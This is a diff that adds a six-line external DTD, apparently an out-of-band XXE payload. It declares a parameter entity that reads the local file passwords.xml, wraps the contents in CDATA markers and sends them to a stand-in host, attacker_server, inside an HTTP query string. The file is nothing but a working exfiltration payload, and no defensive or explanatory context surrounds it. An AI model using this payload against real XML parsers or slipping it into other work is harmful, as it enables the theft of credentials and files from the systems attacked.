@@ -1,0 +1,6 @@
+<!ENTITY % file SYSTEM "file:///passwords.xml">
+<!ENTITY % start "<!CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % ent "<!ENTITY &#x25; exfiltrate 'http://attacker_server/?start;%file;%end;'>">
+%ent;
+%exfiltrate;
